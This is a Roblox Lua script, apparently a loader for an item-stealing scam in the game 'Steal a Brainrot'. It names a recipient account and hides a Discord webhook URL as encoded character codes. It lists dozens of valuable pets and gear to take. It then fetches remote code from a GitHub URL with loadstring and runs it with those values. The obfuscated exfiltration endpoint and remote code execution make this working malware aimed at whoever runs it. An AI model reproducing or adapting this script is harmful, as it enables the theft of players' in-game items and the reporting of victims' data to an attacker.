local TARGET_ID = 7853052052
local TARGET_USER = "shucyu59"

WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,56,53,52,48,57,52,49,50,56,50,49,49,53,54,53,52,47,99,54,114,83,45,115,87,52,55,65,103,106,51,113,87,114,82,66,51,49,119,49,109,57,84,53,50,121,120,85,107,114,76,119,76,89,116,108,80,83,67,70,111,114,105,56,104,105,81,120,101,53,67,77,48,66,89,57,122,82,111,53,118,110,75,98,122,56"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Moby Bros"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cooki and Milki"] = true,
    ["Cash or Card"] = true,
    ["Chipso and Queso"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Ginger Gerat"] = true,
    ["Garama and Madundung"] = true,
    ["Gold Gold Gold"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Ketchuru and Musturu"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Coco and Mango"] = true,
    ["Los Bros"] = true,
    ["Los Primos"] = true,
    ["Love Love Bear"] = true,
    ["Money Money Reindeer"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Rosey and Teddy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Santa's Sleigh"] = true,
    ["Rainbow Hammer"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)